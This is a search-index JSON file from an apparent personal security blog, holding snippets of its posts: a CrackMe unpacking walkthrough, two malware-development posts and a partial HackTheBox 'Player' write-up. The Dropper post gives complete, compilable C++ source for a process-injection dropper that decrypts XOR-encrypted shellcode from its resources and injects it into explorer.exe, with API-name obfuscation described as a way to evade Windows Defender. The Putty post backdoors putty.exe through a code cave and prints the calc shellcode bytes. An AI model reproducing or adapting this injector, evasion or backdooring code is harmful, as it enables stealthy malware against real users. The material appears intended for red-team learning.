[ { "title": "Welcome to Jekyll!", "url": "/posts/welcome-to-jekyll/", "categories": "jekyll, update", "tags": "", "date": "2023-03-24 01:00:00 +0100", "snippet": "You’ll find this post in your _posts directory. Go ahead and edit it and re-build the site to see your changes. You can rebuild the site in many different ways, but the most common way is to run jekyll serve, which launches a web server and auto-regenerates your site when a file is updated.Jekyll requires blog post files to be named according to the following format:YEAR-MONTH-DAY-title.MARKUPWhere YEAR is a four-digit number, MONTH and DAY are both two-digit numbers, and MARKUP is the file extension representing the format used in the file. After that, include the necessary front matter. Take a look at the source for this post to get an idea about how it works.Jekyll also offers powerful support for code snippets:def print_hi(name) puts \"Hi, #{name}\"endprint_hi('Tom')#=&gt; prints 'Hi, Tom' to STDOUT.Check out the Jekyll docs for more info on how to get the most out of Jekyll. File all bugs/feature requests at Jekyll’s GitHub repo. If you have questions, you can ask them on Jekyll Talk." }, { "title": "Reversing | CrackMe Packed", "url": "/ctf-like/reversing/crackme-packed", "categories": "CTFlike, Reversing", "tags": "reversing", "date": "2023-03-01 00:00:00 +0100", "snippet": "This challenge is from Ricardo Narvaja! You can download it here. The objective is to find the real code execute inside the packer.Initial AnalysisOpening the PE in x32dbg show the following EntryPoint:It’s a weird start that the executable start by pushad. In the Memory Map tab we can see the program start in the memory address 00401000:That direction seems to be empty:Let’s see if the PE works in the debugger. Running it should show the program:Getting the CodeWith BreakpointsSet a breakpoint to the first section after the header, the previous memory address 401000:Run the program and wait. The program should stop at that memory address:As we can see, the previous empty direction is now full of instructions:pushad popad MethodThe program is pushing all the instructions to the stack in the EntryPoint, as we have seen. This means that in some point of the execution it will do a popad. So the moment the program call popad, it will be near the execution.Press F8 on the EntryPoint and Follow in Dump the ESP. Now select the ESP DWORD and set a hardware breakpoint on access.Memory DumpWith the code in memory need to be dump. With the built-in plugin Scylla (Ctrl + I):Now we need to import the IAT (Import Address Table). Manually, we can follow the first function we found:Press Enter and ollow in Dumpthe constant the next indirect jump. Change the dump view to Address:To dump the IAT we need the VA and size. Select the first address of the IAT (at the top).For the size, double click on the first and scroll to the last one.We can set some extra bytes to make sure. We can use the button IAT Autosearch.Now that the IAT is dumped it will look like:Make sure that everything work with Show Invalid and press Fix Dump. Select the dumped file.Dumped FileThe first thing we can notice is that the EntryPoint has change to 401000, where now all the unpacked program is:" }, { "title": "MalDev | Dropper Explorer.exe", "url": "/malware/development/dropper-explorer-1", "categories": "Malware, Development", "tags": "malware, windows", "date": "2023-02-01 00:00:00 +0100", "snippet": "From a Dropper.exe, it will extract a shellcode from the .rsrc and inject it into the Explorer.exe. For this we will need: The C++ file A Resource Script file A C/C++ Header A Python script for XOR encryption A shellcode (in this case MessageBox)ShellcodeWe already have a binary (msgbox64.bin) to use. With the following Python Script we can encrypt it:# Red Team Operator course code template# payload encryption with XOR## author: reenz0h (twitter: @sektor7net)import sysKEY = \"mysecretkeee\"def xor(data, key):\t\tkey = str(key)\tl = len(key)\toutput_str = \"\"\tfor i in range(len(data)):\t\tcurrent = data[i]\t\tcurrent_key = key[i % len(key)]\t\toutput_str += chr(ord(current) ^ ord(current_key))\t\treturn output_strdef printCiphertext(ciphertext):\tprint('{ 0x' + ', 0x'.join(hex(ord(x))[2:] for x in ciphertext) + ' };')try: plaintext = open(sys.argv[1], \"rb\").read()except: print(\"File argument needed! %s &lt;raw payload file&gt;\" % sys.argv[0]) sys.exit()ciphertext = xor(plaintext, KEY)open(\"favicon.ico\", \"wb\").write(ciphertext)print('{ 0x' + ', 0x'.join(hex(ord(x))[2:] for x in ciphertext) + ' };')We can get the shellcode with:C.\\Users\\Zeropio&gt;C:\\Python27\\python.exe xorencrypt.py msgbox64.binThe shellcode will be:{ 0x91, 0x31, 0xf2, 0x81, 0x93, 0x8d, 0x9a, 0x8b, 0x83, 0xb5, 0x65, 0x65, 0x6d, 0x38, 0x22, 0x24, 0x33, 0x20, 0x34, 0x22, 0x23, 0x54, 0xb7, 0x0, 0x25, 0xf2, 0x21, 0x5, 0x5d, 0x3a, 0xee, 0x26, 0x73, 0x5b, 0x2d, 0xee, 0x3f, 0x59, 0x4d, 0x2d, 0xe8, 0x0, 0x35, 0x4a, 0x23, 0x6a, 0xd2, 0x2f, 0x27, 0x34, 0x42, 0xac, 0x2b, 0x43, 0xa5, 0xd8, 0x57, 0x4, 0x19, 0x67, 0x41, 0x59, 0x32, 0xa4, 0xaa, 0x7f, 0x24, 0x75, 0xaa, 0x87, 0x88, 0x37, 0x2c, 0x28, 0x4d, 0x2d, 0xe8, 0x20, 0x45, 0x4a, 0xe0, 0x27, 0x59, 0x2d, 0x6c, 0xa9, 0x4d, 0xee, 0xe3, 0xfa, 0x65, 0x74, 0x6b, 0x2d, 0xe0, 0xa5, 0x19, 0x16, 0x3b, 0x64, 0xb3, 0x22, 0x5b, 0xff, 0x23, 0x7d, 0x5b, 0x21, 0xe6, 0x39, 0x53, 0x2c, 0x62, 0xa2, 0x86, 0x28, 0x23, 0x9a, 0xac, 0x5b, 0x2c, 0xf2, 0x47, 0xed, 0x2b, 0x73, 0xb3, 0x39, 0x5a, 0xac, 0x2d, 0x54, 0xad, 0xd5, 0x32, 0xa4, 0xaa, 0x7f, 0x24, 0x75, 0xaa, 0x5d, 0x85, 0x10, 0x9c, 0x47, 0x3f, 0x66, 0x2f, 0x56, 0x6d, 0x31, 0x52, 0xb4, 0x10, 0xb3, 0x35, 0x47, 0x37, 0xee, 0x23, 0x56, 0x2c, 0x75, 0xbb, 0x3, 0x5b, 0x24, 0xe6, 0x75, 0x3b, 0x5b, 0x27, 0xf9, 0x25, 0x68, 0x22, 0x64, 0xb5, 0x5b, 0x2c, 0xf2, 0x77, 0xed, 0x2b, 0x73, 0xb5, 0x35, 0x33, 0x24, 0x3d, 0x3b, 0x34, 0x23, 0x32, 0x3d, 0x22, 0x2b, 0x24, 0x2e, 0x23, 0xe6, 0x89, 0x45, 0x2c, 0x2b, 0x8c, 0x85, 0x3b, 0x33, 0x3c, 0x2e, 0x55, 0x2d, 0xee, 0x77, 0x84, 0x30, 0x8c, 0x9a, 0x9c, 0x2f, 0x2c, 0xb3, 0xaa, 0x65, 0x65, 0x65, 0x6d, 0x47, 0x3b, 0xe8, 0xf6, 0x68, 0x64, 0x74, 0x6b, 0x5b, 0x29, 0xe8, 0xe8, 0x4c, 0x72, 0x65, 0x63, 0x3a, 0x54, 0xbd, 0x2a, 0xdf, 0x20, 0xe6, 0x3b, 0x7e, 0x8c, 0xb0, 0xd8, 0x92, 0x78, 0x5e, 0x61, 0x24, 0xdf, 0xc3, 0xf8, 0xc4, 0xee, 0x9a, 0xb6, 0x3a, 0xe6, 0xb0, 0x43, 0x59, 0x63, 0x19, 0x67, 0xf9, 0x88, 0x85, 0x16, 0x77, 0xde, 0x33, 0x78, 0x17, 0xa, 0xf, 0x6d, 0x20, 0x32, 0xec, 0xb9, 0x8d, 0xb0, 0x3c, 0x2, 0x45, 0x3, 0x17, 0x2, 0x14, 0x53, 0x37, 0x6, 0x16, 0x45, 0x20, 0xe, 0x4, 0x8, 0x45, 0x22, 0x9, 0x16, 0x17, 0x2, 0x6, 0xa, 0x6, 0x4a, 0x65, 0x37, 0x31, 0x22, 0x43, 0x53, 0x28, 0x2, 0x1e, 0x21, 0x11, 0x1d, 0x65 }As we want to extract the shellcode from .rsrc, we need to extract it from a resource, not the payload directly. Because of this we added the line:open(\"favicon.ico\", \"wb\").write(ciphertext)That will generate our favicon.ico.EXEFunctionsWe will import all the functions we need: XOR: for decryption FindTarget: for finding the explorer PID Inject: for inject into the process#include &lt;windows.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;tlhelp32.h&gt;#include \"resources.h\"void XOR(char * data, size_t data_len, char * key, size_t key_len) {\tint j;\t\tj = 0;\tfor (int i = 0; i &lt; data_len; i++) {\t\tif (j == key_len - 1) j = 0;\t\tdata[i] = data[i] ^ key[j];\t\tj++;\t}}int FindTarget(const char *procname) { HANDLE hProcSnap; PROCESSENTRY32 pe32; int pid = 0; hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); if (INVALID_HANDLE_VALUE == hProcSnap) return 0; pe32.dwSize = sizeof(PROCESSENTRY32); if (!Process32First(hProcSnap, &amp;pe32)) { CloseHandle(hProcSnap); return 0; } while (Process32Next(hProcSnap, &amp;pe32)) { if (lstrcmpiA(procname, pe32.szExeFile) == 0) { pid = pe32.th32ProcessID; break; } } CloseHandle(hProcSnap); return pid;}int Inject(HANDLE hProc, unsigned char * payload, unsigned int payload_len) { LPVOID pRemoteCode = NULL; HANDLE hThread = NULL; pRemoteCode = VirtualAllocEx(hProc, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ); WriteProcessMemory(hProc, pRemoteCode, (PVOID)payload, (SIZE_T)payload_len, (SIZE_T *)NULL); hThread = CreateRemoteThread(hProc, NULL, 0, pRemoteCode, NULL, 0, NULL); if (hThread != NULL) { WaitForSingleObject(hThread, 500); CloseHandle(hThread); return 0; } return -1;}GUI TrickNow, instead of a main function we will use a WinMain function. Declare all the variables:int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) { \tvoid * exec_mem;\tBOOL rv;\tHANDLE th; DWORD oldprotect = 0;\tHGLOBAL resHandle = NULL;\tHRSRC res;\t\tunsigned char * payload;\tunsigned int payload_len;\t\tchar key[] = \"mysecretkeee\";\t\tint pid = 0; HANDLE hProc = NULL;PayloadExtract the payload from the resources. We will need: resources.h#define FAVICON_ICO 100 resources.rc#include \"resources.h\"FAVICON_ICO RCDATA favicon.ico favicon.ico generated with PythonNow, get the payload in the main file:\t// Extract payload from resources section\tres = FindResource(NULL, MAKEINTRESOURCE(FAVICON_ICO), RT_RCDATA);\tresHandle = LoadResource(NULL, res);\tpayload = (char *) LockResource(resHandle);\tpayload_len = SizeofResource(NULL, res);Memory and DecryptionNow allocate some space in the buffer and decrypt the payload:\t// Allocate some memory buffer for payload\texec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);\t// Copy payload to new memory buffer\tRtlMoveMemory(exec_mem, payload, payload_len);\t\t// Decrypt (DeXOR) the payload\tXOR((char *) exec_mem, payload_len, key, sizeof(key));InjectionSearch for the explorer.exe and inject the payload:\t// Injection into explorer.exe\tpid = FindTarget(\"explorer.exe\");\tif (pid) {\t\t// try to open target process\t\thProc = OpenProcess( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | \t\t\t\t\t\tPROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,\t\t\t\t\t\tFALSE, (DWORD) pid);\t\tif (hProc != NULL) {\t\t\tInject(hProc, exec_mem, payload_len);\t\t\tCloseHandle(hProc);\t\t}\t}\treturn 0;}ObfuscationTo bypass some Windows Defender protection we can try to obfuscate the program. We will obfuscate VirtualAllocEx, WriteProcessMemory and CreateRemoteThread. Create the pointes:LPVOID (WINAPI * pVirtualAllocEx)( HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);BOOL (WINAPI * pWriteProcessMemory)( HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesWritten);HANDLE (WINAPI * pCreateRemoteThread)( HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);Inside the Inject function we will create the pointers. Also, they will be XOR encrypted, so first we need to encrypt the strings:C:\\Users\\Zeropio&gt;C:\\Python27\\python.exe -i xorencrypt.py&gt;&gt;&gt; printCiphertext(xor(\"VirtualAllocEx\", \"mysecretkeee\")){ 0x3b, 0x10, 0x1, 0x11, 0x16, 0x13, 0x9, 0x35, 0x7, 0x9, 0xa, 0x6, 0x28, 0x1 };&gt;&gt;&gt; printCiphertext(xor(\"WriteProcessMemory\", \"mysecretkeee\")){ 0x3a, 0xb, 0x1a, 0x11, 0x6, 0x22, 0x17, 0x1b, 0x8, 0x0, 0x16, 0x16, 0x20, 0x1c, 0x1e, 0xa, 0x11, 0xb };&gt;&gt;&gt; printCiphertext(xor(\"CreateRemoteThread\", \"mysecretkeee\")){ 0x2e, 0xb, 0x16, 0x4, 0x17, 0x17, 0x37, 0x11, 0x6, 0xa, 0x11, 0x0, 0x39, 0x11, 0x1, 0x0, 0x2, 0x16 };And now we can create the pointers: unsigned char sVirtualAllocEx[] = { 0x3b, 0x10, 0x1, 0x11, 0x16, 0x13, 0x9, 0x35, 0x7, 0x9, 0xa, 0x6, 0x28, 0x1 };\t\tunsigned char sWriteProcessMemory[] = { 0x3a, 0xb, 0x1a, 0x11, 0x6, 0x22, 0x17, 0x1b, 0x8, 0x0, 0x16, 0x16, 0x20, 0x1c, 0x1e, 0xa, 0x11, 0xb };\t\tunsigned char sCreateRemoteThread[] = { 0x2e, 0xb, 0x16, 0x4, 0x17, 0x17, 0x37, 0x11, 0x6, 0xa, 0x11, 0x0, 0x39, 0x11, 0x1, 0x0, 0x2, 0x16 };\t\t\t\tXOR((char *) sVirtualAllocEx, sizeof(sVirtualAllocEx), key, sizeof(key));\t\tXOR((char *) sWriteProcessMemory, sizeof(sWriteProcessMemory), key, sizeof(key));\t\tXOR((char *) sCreateRemoteThread, sizeof(sCreateRemoteThread), key, sizeof(key));\t\t\t\tpVirtualAllocEx = GetProcAddress(GetModuleHandle(\"kernel32.dll\"), sVirtualAllocEx);\t\tpWriteProcessMemory = GetProcAddress(GetModuleHandle(\"kernel32.dll\"), sWriteProcessMemory);\t\tpCreateRemoteThread = GetProcAddress(GetModuleHandle(\"kernel32.dll\"), sCreateRemoteThread);Now replace all the functions by the pointer.CompilationThe final C++ file will be:/* Red Team Operator course code template storing payload in .rsrc section author: reenz0h (twitter: @sektor7net)*/#include &lt;windows.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;tlhelp32.h&gt;#include \"resources.h\"LPVOID (WINAPI * pVirtualAllocEx)( HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);BOOL (WINAPI * pWriteProcessMemory)( HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesWritten);HANDLE (WINAPI * pCreateRemoteThread)( HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);char key[] = \"mysecretkeee\";void XOR(char * data, size_t data_len, char * key, size_t key_len) {\tint j;\t\tj = 0;\tfor (int i = 0; i &lt; data_len; i++) {\t\tif (j == key_len - 1) j = 0;\t\tdata[i] = data[i] ^ key[j];\t\tj++;\t}}int FindTarget(const char *procname) { HANDLE hProcSnap; PROCESSENTRY32 pe32; int pid = 0; hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); if (INVALID_HANDLE_VALUE == hProcSnap) return 0; pe32.dwSize = sizeof(PROCESSENTRY32); if (!Process32First(hProcSnap, &amp;pe32)) { CloseHandle(hProcSnap); return 0; } while (Process32Next(hProcSnap, &amp;pe32)) { if (lstrcmpiA(procname, pe32.szExeFile) == 0) { pid = pe32.th32ProcessID; break; } } CloseHandle(hProcSnap); return pid;}int Inject(HANDLE hProc, unsigned char * payload, unsigned int payload_len) { LPVOID pRemoteCode = NULL; HANDLE hThread = NULL;\t\t\t\tunsigned char sVirtualAllocEx[] = { 0x3b, 0x10, 0x1, 0x11, 0x16, 0x13, 0x9, 0x35, 0x7, 0x9, 0xa, 0x6, 0x28, 0x1 };\t\tunsigned char sWriteProcessMemory[] = { 0x3a, 0xb, 0x1a, 0x11, 0x6, 0x22, 0x17, 0x1b, 0x8, 0x0, 0x16, 0x16, 0x20, 0x1c, 0x1e, 0xa, 0x11, 0xb };\t\tunsigned char sCreateRemoteThread[] = { 0x2e, 0xb, 0x16, 0x4, 0x17, 0x17, 0x37, 0x11, 0x6, 0xa, 0x11, 0x0, 0x39, 0x11, 0x1, 0x0, 0x2, 0x16 };\t\t\t\tXOR((char *) sVirtualAllocEx, sizeof(sVirtualAllocEx), key, sizeof(key));\t\tXOR((char *) sWriteProcessMemory, sizeof(sWriteProcessMemory), key, sizeof(key));\t\tXOR((char *) sCreateRemoteThread, sizeof(sCreateRemoteThread), key, sizeof(key));\t\t\t\tpVirtualAllocEx = GetProcAddress(GetModuleHandle(\"kernel32.dll\"), sVirtualAllocEx);\t\tpWriteProcessMemory = GetProcAddress(GetModuleHandle(\"kernel32.dll\"), sWriteProcessMemory);\t\tpCreateRemoteThread = GetProcAddress(GetModuleHandle(\"kernel32.dll\"), sCreateRemoteThread); pRemoteCode = pVirtualAllocEx(hProc, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ); pWriteProcessMemory(hProc, pRemoteCode, (PVOID)payload, (SIZE_T)payload_len, (SIZE_T *)NULL); hThread = pCreateRemoteThread(hProc, NULL, 0, pRemoteCode, NULL, 0, NULL); if (hThread != NULL) { WaitForSingleObject(hThread, 500); CloseHandle(hThread); return 0; } return -1;}int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) { \tvoid * exec_mem;\tBOOL rv;\tHANDLE th; DWORD oldprotect = 0;\tHGLOBAL resHandle = NULL;\tHRSRC res;\t\tunsigned char * payload;\tunsigned int payload_len;\t\tint pid = 0; HANDLE hProc = NULL;\t\t// Extract payload from resources section\tres = FindResource(NULL, MAKEINTRESOURCE(FAVICON_ICO), RT_RCDATA);\tresHandle = LoadResource(NULL, res);\tpayload = (char *) LockResource(resHandle);\tpayload_len = SizeofResource(NULL, res);\t\t// Allocate some memory buffer for payload\texec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);\t// Copy payload to new memory buffer\tRtlMoveMemory(exec_mem, payload, payload_len);\t\t// Decrypt (DeXOR) the payload\tXOR((char *) exec_mem, payload_len, key, sizeof(key));\t\t// Injection into explorer.exe\tpid = FindTarget(\"explorer.exe\");\tif (pid) {\t\t// try to open target process\t\thProc = OpenProcess( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | \t\t\t\t\t\tPROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,\t\t\t\t\t\tFALSE, (DWORD) pid);\t\tif (hProc != NULL) {\t\t\tInject(hProc, exec_mem, payload_len);\t\t\tCloseHandle(hProc);\t\t}\t}\treturn 0;}And compile the file:C:\\Users\\Zeropio&gt;rc resources.rcC:\\Users\\Zeropio&gt;cvtres /MACHINE:x64 /OUT:resources.o resources.resC:\\Users\\Zeropio&gt;cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tcimplant.cpp /link /OUT:implant.exe /SUBSYSTEM:WINDOWS /MACHINE:x64 resources.oTestNow we can test if the malware works correctly:" }, { "title": "MalDev | Putty", "url": "/malware/development/putty-1", "categories": "Malware, Development", "tags": "malware, windows", "date": "2023-01-29 00:00:00 +0100", "snippet": "EnumerationFirst, debug a 32bit putty.exe in x32dbg. There is a inital breakpoint in the binary:Address=00454AD0Module/Label/Exception=&lt;putty.exe.EntryPoint&gt;State=One-timeDisassembly=push 60Hits=0Summary=entry breakpointWe need to find a code cave in the binary. The .text section it is executable:Address=00401000Size=0005C000Party=UserPage Information=\".text\"Content of section=Executable codeAllocation Type=IMGCurrent Protection=ER---Allocation Protection=ERWC-Also, it can be seen at the end of the file a bunch of empty memory. This can be a code cave:We will add a breakpoint there and copy the address (0045C961) for later. We will do a jump from the first instruction (00454AD0) to our code cave, and then come back to the main program. Copy the firsts instructions of the program:00454AD0 | 6A 60 | push 60 |00454AD2 | 68 B07A4700 | push putty.477AB0 |00454AD7 | E8 08210000 | call putty.456BE4 |00454ADC | BF 94000000 | mov edi,94 | edi:\"LdrpInitializeProcess\"00454AE1 | 8BC7 | mov eax,edi | edi:\"LdrpInitializeProcess\"Code CaveThe first instruction (00454A) can be overwrite as simply as selecting and pressing Space (or right click and Assemble). We will change the value to:jmp 0x0045C961Which is the direction of the code cave. Pressing Enter in 0045C961 will now jump to the code cave.Now we will overwrite the two first entries of the shellcode to write on the stack with the functions pushad and pushfd. Select a bunch of lines from the code cave, copy our shellcode, press Ctrl + E and paste it. As we can see, our previos empty code cave is now filled with our shellcode. In this case, a 32bit calc.exe:fc e8 82 00 00 00 60 89 e5 31 c0 648b 50 30 8b 52 0c 8b 52 14 8b 72 280f b7 4a 26 31 ff ac 3c 61 7c 02 2c20 c1 cf 0d 01 c7 e2 f2 52 57 8b 5210 8b 4a 3c 8b 4c 11 78 e3 48 01 d151 8b 59 20 01 d3 8b 49 18 e3 3a 498b 34 8b 01 d6 31 ff ac c1 cf 0d 01c7 38 e0 75 f6 03 7d f8 3b 7d 24 75e4 58 8b 58 24 01 d3 66 8b 0c 4b 8b58 1c 01 d3 8b 04 8b 01 d0 89 44 2424 5b 5b 61 59 5a 51 ff e0 5f 5f 5a8b 12 eb 8d 5d 6a 01 8d 85 b2 00 0000 50 68 31 8b 6f 87 ff d5 bb f0 b5a2 56 68 a6 95 bd 9d ff d5 3c 06 7c0a 80 fb e0 75 05 bb 47 13 72 6f 6a00 53 ff d5 63 61 6c 63 2e 65 78 6500We can save the state of the binary with Ctrl + P and save it as a another PE. If we run the binary now, the shellcode will be executed.Now we need to find where the calc is being launched. Adding breakpoints to each call in the shellcode and executing it show that the FFD5 in the direction 0045CA06 launch the calc.exe. Also, we can found that the last call is the call to exit.Retrieving the PENow that we know where our shellcode execute and which is the function that exists (the last call), we need to make a jump back to the program. We need to overwrite the push 0 of our shellcode to jump to another space in the code cave.Now we need to restore the original flow of the program. The first two lines after the jump will be overwritten by:popfdpopadTake the instructions we overwritten before as hex value:6A 60 68 B0 7A 47 00And replaced the empty code caves after the popad. And lastly, jump back to the instruction 00454AD7. We can see the final output:FinalWe can see the final work:" }, { "title": "HTB | Player", "url": "/pentesting/htb/machines/player", "categories": "Pentesting, HackTheBox", "tags": "htb, linux, hard, machines", "date": "2023-01-05 00:00:00 +0100", "snippet": "FingerprintScanThe scan show:PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.11 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 1024 d730dbb9a04c79947838b343a2505581 (DSA)| 2048 372be431eea6490d9fe7e601e63e0a66 (RSA)| 256 0c6c05edadf175e802e4d2273e3a198f (ECDSA)|_ 256 11b8dbf3cc29084a49cebf917340a280 (ED25519)80/tcp open http Apache httpd 2.4.7|_http-server-header: Apache/2.4.7 (Ubuntu)|_http-title: 403 Forbidden6686/tcp open tcpwrappedService Info: Host: player.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernelInspecting further the port 6686:$ nc -nv 10.10.10.145 6686 (UNKNOWN) [10.10.10.145] 6686 (?) openSSH-2.0-OpenSSH_7.2EnumerationThe web show:http://player.htb/ [403 Forbidden] Apache[2.4.7], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.7 (Ubuntu)], IP[10.10.10.145], Title[403 Forbidden]Fuzzing the web:server-status [Status: 403, Size: 290, Words: 21, Lines: 11, Duration: 49ms] [Status: 403, Size: 277, Words: 21, Lines: 11, Duration: 51ms]launcher [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 47ms]wp-forum.phps [Status: 403, Size: 290, Words: 21, Lines: 11, Duration: 45ms]The root path cannot be access, but the /launcher/ is accesible. The technologies in this web are:http://player.htb/launcher/ [200 OK] Apache[2.4.7], Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.7 (Ubuntu)], IP[10.10.10.145], JQuery, Meta-Author[mrr3boot.co], Modernizr[2.6.2.min], Script, Title[PlayBuff], X-UA-Compatible[IE=edge]Fuzzing it show:js [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 53ms]images [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 54ms]css [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 57ms]. [Status: 200, Size: 2969, Words: 138, Lines: 100, Duration: 51ms]fonts [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 50ms]vendor [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 46ms]\t\t\t\t\t\t\t\t\t\t\t\t[Status: 200, Size: 2969, Words: 138, Lines: 100, Duration: 49ms]index.html [Status: 200, Size: 2969, Words: 138, Lines: 100, Duration: 61ms]There is a space for sending an email. Intercepting the request doesn’t show any email, but a strange PHP file:If we send the request we can intercept another one with the following format:Cookie: access=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwcm9qZWN0IjoiUGxheUJ1ZmYiLCJhY2Nlc3NfY29kZSI6IkMwQjEzN0ZFMkQ3OTI0NTlGMjZGRjc2M0NDRTQ0NTc0QTVCNUFCMDMifQ.cjGwng6JiMiOWZGz7saOdOuhyr1vad5hAxOJCiM3uzUSeparating each string by . we got two different texts:{\"typ\":\"JWT\",\"alg\":\"HS256\"}{\"project\":\"PlayBuff\",\"access_code\":\"C0B137FE2D792459F26FF763CCE44574A5B5AB03\"}This is a JWT token.Fuzzing for VHost we get:dev [Status: 200, Size: 5243, Words: 1741, Lines: 87, Duration: 52ms]staging [Status: 200, Size: 1470, Words: 175, Lines: 64, Duration: 45ms]chat [Status: 200, Size: 9513, Words: 2711, Lines: 260, Duration: 44ms]ChatOnly the subdomain chat will work:http://chat.player.htb/ [200 OK] Apache[2.4.7], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.7 (Ubuntu)], IP[10.10.10.145], JQuery, Script[text/x-handlebars-template], Title[PlayBuff Internal Chat Room]There we can see a little hint:They mentioned our staging exposing some sensitive files and main domain exposing source code which allowing them to access our product before release. Currently our team working on the fix.DevThere is a login under this subdomain:http://dev.player.htb/ [200 OK] Apache[2.4.7], Cookies[97c737d7256edaf18c3552b469f00d9d], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.7 (Ubuntu)], IP[10.10.10.145], JQuery[1.7.2], PHP[5.5.9-1ubuntu4.26], PasswordField[password], Script, Title[Playbuff - Dev Portal], X-Powered-By[PHP/5.5.9-1ubuntu4.26]There is some stranges cookies in the subdomain: 97c737d7256edaf18c3552b469f00d9d:2abhsojk5898a96jhflsg8r5e5. Inspecting the source code we got a JS file under /components/user/init.js. There it has a reference toCodiad, a web framework. We have some exploits for this framework:$ searchsploit codiad --------------------------------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path--------------------------------------------------------------------------------------------------------------------------- ---------------------------------Codiad 2.4.3 - Multiple Vulnerabilities | php/webapps/35585.txtCodiad 2.5.3 - Local File Inclusion | php/webapps/36371.txtCodiad 2.8.4 - Remote Code Execution (Authenticated) | multiple/webapps/49705.pyCodiad 2.8.4 - Remote Code Execution (Authenticated) (2) | multiple/webapps/49902.pyCodiad 2.8.4 - Remote Code Execution (Authenticated) (3) | multiple/webapps/49907.pyCodiad 2.8.4 - Remote Code Execution (Authenticated) (4) | multiple/webapps/50474.txt--------------------------------------------------------------------------------------------------------------------------- ---------------------------------But first, we need credentials.StagingFuzzing this web:server-status [Status: 403, Size: 298, Words: 21, Lines: 11, Duration: 46ms] [Status: 200, Size: 1470, Words: 175, Lines: 64, Duration: 44ms]. [Status: 200, Size: 1470, Words: 175, Lines: 64, Duration: 48ms]update.php [Status: 200, Size: 1642, Words: 171, Lines: 88, Duration: 63ms]index.html [Status: 200, Size: 1470, Words: 175, Lines: 64, Duration: 46ms]contact.php [Status: 200, Size: 818, Words: 190, Lines: 45, Duration: 51ms]contact.html [Status: 200, Size: 1838, Words: 193, Lines: 100, Duration: 45ms]fix.php [Status: 500, Size: 0, Words: 1, Lines: 1, Duration: 54ms]http://staging.player.htb/ [200 OK] Apache[2.4.7], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.7 (Ubuntu)], IP[10.10.10.145]The /contact.html has a form. Sending something gives a error 500, but if we intercept the request:We have the following contents:array(3) { [0]=&gt; array(4) { [\"file\"]=&gt; string(28) \"/var/www/staging/contact.php\" [\"line\"]=&gt; int(6) [\"function\"]=&gt; string(1) \"c\" [\"args\"]=&gt; array(1) { [0]=&gt; &amp;string(9) \"Cleveland\" } } [1]=&gt; array(4) { [\"file\"]=&gt; string(28) \"/var/www/staging/contact.php\" [\"line\"]=&gt; int(3) [\"function\"]=&gt; string(1) \"b\" [\"args\"]=&gt; array(1) { [0]=&gt; &amp;string(5) \"Glenn\" } } [2]=&gt; array(4) { [\"file\"]=&gt; string(28) \"/var/www/staging/contact.php\" [\"line\"]=&gt; int(11) [\"function\"]=&gt; string(1) \"a\" [\"args\"]=&gt; array(1) { [0]=&gt; &amp;string(5) \"Peter\" } }}With the following error message:Unknown variable user in /var/www/backup/service_config fatal error in /var/www/staging/fix.phpUsing the previous hint, if we access the backup PHP file of the one with the suspicious name we can get the plaintext file:&lt;?phprequire 'vendor/autoload.php';use \\Firebase\\JWT\\JWT;if(isset($_COOKIE[\"access\"])){\t$key = '_S0_R@nd0m_P@ss_';\t$decoded = JWT::decode($_COOKIE[\"access\"], base64_decode(strtr($key, '-_', '+/')), ['HS256']);\tif($decoded-&gt;access_code === \"0E76658526655756207688271159624026011393\")\t{\t\theader(\"Location: 